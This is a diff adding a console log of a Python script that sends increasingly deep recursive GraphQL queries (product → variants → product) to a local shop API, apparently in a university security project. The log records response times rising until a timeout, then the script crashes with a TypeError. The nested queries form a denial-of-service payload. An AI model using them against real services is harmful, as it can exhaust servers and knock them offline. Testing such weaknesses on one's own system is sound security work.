@@ -1,0 +1,39 @@
+> python .\DoS_RecursionAutomatic.py -u http://localhost:3000/shop-api -c variants product --root product --root-args 'id: \"1\"'
+
+
+Testing recursion: variants -> product
+Wrapped in root field: product(id: "1")
+Depths 2-20 (step 2) with timeout=10.0s and threshold=5.0s
+
+
+------------------------------------------------------------
+
+
+
+The following query was build:query recursiveTest { product(id: "1") { variants { product { __typename } } } }
+[OK]   Depth 2 completed in 0.07s (HTTP 200)
+
+The following query was build:query recursiveTest { product(id: "1") { variants { product { variants { product { __typename } } } } } }
+[OK]   Depth 4 completed in 0.06s (HTTP 200)
+
+The following query was build:query recursiveTest { product(id: "1") { variants { product { variants { product { variants { product { __typename } } } } } } } }
+[OK]   Depth 6 completed in 0.12s (HTTP 200)
+
+The following query was build:query recursiveTest { product(id: "1") { variants { product { variants { product { variants { product { variants { product { __typename } } } } } } } } } }
+[OK]   Depth 8 completed in 0.29s (HTTP 200)
+
+The following query was build:query recursiveTest { product(id: "1") { variants { product { variants { product { variants { product { variants { product { variants { product { __typename } } } } } } } } } } } }
+[OK]   Depth 10 completed in 0.85s (HTTP 200)
+
+The following query was build:query recursiveTest { product(id: "1") { variants { product { variants { product { variants { product { variants { product { variants { product { variants { product { __typename } } } } } } } } } } } } } }
+[OK]   Depth 12 completed in 2.72s (HTTP 200)
+
+The following query was build:query recursiveTest { product(id: "1") { variants { product { variants { product { variants { product { variants { product { variants { product { variants { product { variants { product { __typename } } } } } } } } } } } } } } } }
+[Error] Exception – HTTPConnectionPool(host='localhost', port=3000): Read timed out. (read timeout=10.0)
+Traceback (most recent call last):
+  File "C:\Users\e_sop\Dateien\KTH\25_26\LanguageBasedSec\language\Project\DoS_Recursion\DoS_RecursionAutomatic.py", line 135, in <module>
+    main()
+  File "C:\Users\e_sop\Dateien\KTH\25_26\LanguageBasedSec\language\Project\DoS_Recursion\DoS_RecursionAutomatic.py", line 125, in main
+    print("\n" + f"Stopping at depth {depth} (elapsed {elapsed:.2f}s)")
+                                                      ^^^^^^^^^^^^^
+TypeError: unsupported format string passed to NoneType.__format__
